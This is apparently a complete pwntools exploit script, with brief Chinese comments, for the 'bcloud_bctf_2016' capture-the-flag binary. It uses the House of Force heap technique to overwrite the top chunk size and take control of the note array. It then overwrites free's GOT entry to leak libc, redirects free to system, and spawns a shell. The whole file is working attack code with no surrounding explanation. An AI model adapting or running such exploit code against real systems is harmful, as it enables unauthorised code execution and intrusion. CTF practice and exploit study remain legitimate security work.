#coding:utf8
from pwn import *

#house of  force
sh = process('./bcloud_bctf_2016')
elf = ELF('./bcloud_bctf_2016')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
free_got = elf.got['free']
heap_array_addr = 0x0804B120
sh.sendafter('Input your name:','a'*0x40)
sh.recvuntil('a'*0x40)
heap_addr = u32(sh.recv(4))
print 'heap_addr=',hex(heap_addr)
sh.sendafter('Org:','a'*0x40)
#修改top chunk的size
sh.sendlineafter('Host:',p32(0xFFFFFFFF))
top_chunk_addr = heap_addr + 0xD0
print 'top_chunk_addr=',hex(top_chunk_addr)

def add(size,content):
   sh.sendlineafter('option--->>','1')
   sh.sendlineafter('Input the length of the note content:',str(size))
   sh.sendafter('Input the content:',content)

def edit(index,content):
   sh.sendlineafter('option--->>','3')
   sh.sendlineafter('Input the id:',str(index))
   sh.sendafter('Input the new content:',content)

def delete(index):
   sh.sendlineafter('option--->>','4')
   sh.sendlineafter('Input the id:',str(index))
offset = heap_array_addr - top_chunk_addr - 0x10
add(offset,'') #0
#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了
add(0x18,'\n') #1

#修改heap_array
edit(1,p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + '/bin/sh\x00')
#修改free的got表为puts的plt表
edit(1,p32(puts_plt) + '\n')
#泄露puts的地址
delete(2)
sh.recv(1)
puts_addr = u32(sh.recv(4))
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
print 'libc_base=',hex(libc_base)
print 'system_addr=',hex(system_addr)
#修改free的got表为system地址
edit(1,p32(system_addr) + '\n')
#getshell
delete(3)

sh.interactive()
